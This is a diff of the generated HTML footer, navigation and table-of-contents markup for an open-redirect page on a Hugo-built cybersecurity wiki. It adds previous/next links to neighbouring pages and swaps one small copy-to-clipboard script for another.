 <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html" target="_blank" rel="noreferrer noopener nofollow">https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
@@ -2098,49 +1914,62 @@ https://github.com/alex-shpak/hugo-book
         
   <div class="flex flex-wrap justify-between">
 
-
-  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
-      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>August 5, 2026</span>
-    </a>
-  </div>
-
-
-
-  <div>
-    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/Open%20Redirect.md" target="_blank" rel="noopener">
-      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
-      <span>Edit this page</span>
-    </a>
-  </div>
-
+<div>
 
 </div>
 
+<div>
 
+</div>
 
-  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+</div>
 
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/application-security/web/OAuth-Cheatsheet/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>OAuth (Open Authorization)</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/application-security/web/Padding-Oracle-Attacks/" class="flex align-center">
+        <span>Padding Oracle Attacks</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
 
  
         
-      </footer>
-
-      
   
   <div class="book-comments">
 
 </div>
   
  
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
 
       <label for="menu-control" class="hidden book-menu-overlay"></label>
     </div>
 
     
-    <aside class="book-toc">
-      <div class="book-toc-content">
-        
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
   
 <nav id="TableOfContents">
   <ul>
@@ -2209,15 +2038,24 @@ https://github.com/alex-shpak/hugo-book
 </nav>
 
 
+
+    </div>
+  </aside>
+  
  
-      </div>
-    </aside>
-    
   </main>
 
   
 </body>
 </html>
+
+
+
+
+
+
+
+
 
 
 
